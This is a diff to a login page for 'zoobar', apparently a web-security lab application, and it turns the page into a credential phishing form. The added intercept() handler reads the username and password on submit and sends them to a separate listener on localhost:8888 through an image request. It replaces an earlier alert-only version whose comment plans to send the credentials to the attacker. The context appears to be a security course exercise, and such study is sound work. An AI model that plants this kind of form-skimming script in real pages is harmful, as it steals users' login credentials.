@@ -22,7 +22,7 @@
           minds of the information superhighway</h2>
       
 <div id="login" class="centerpiece">
-<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="intercept()">
 <table>
 <tr>
    <td>Username:</td>
@@ -35,13 +35,11 @@
   <input type="submit" name="submit_login" value="Log in">
   <input type="submit" name="submit_registration" value="Register"></td>
 <script>
-function InterceptForm() {
-
-	var username = document.forms[0].elements[0].value;
-	var password = document.forms[0].elements[1].value;
-	alert(username + ',' + password); //TODO: send users credentials in email to the attacker
+    function intercept() {
+    var username = document.forms[0].elements[0].value;
+    var password = document.forms[0].elements[1].value;
+    new Image().src = "http://localhost:8888/?username="+username+"&password="+password;
 }
-document.forms[0].onsubmit = InterceptForm;
 </script>
 </tr>
 </table>
